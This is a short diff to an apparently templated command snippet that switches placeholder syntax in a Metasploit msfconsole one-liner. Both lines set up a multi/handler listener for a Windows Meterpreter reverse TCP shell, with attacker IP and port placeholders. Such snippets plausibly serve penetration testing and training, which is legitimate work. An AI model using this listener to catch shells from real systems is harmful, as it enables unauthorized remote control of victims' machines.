@@ -6,4 +6,4 @@ metadata:
   author: "Unknown"
 
 content: |
-  msfconsole -q -x "use exploit/multi/handler;set payload windows/meterpreter_reverse_tcp;set LHOST <%=$(esh variables/attacker_ip)%>;set LPORT <%=$(esh variables/shell_port)%>;run;"
+  msfconsole -q -x "use exploit/multi/handler;set payload windows/meterpreter_reverse_tcp;set LHOST {{ attacker_ip }};set LPORT {{ shell_port }};run;"
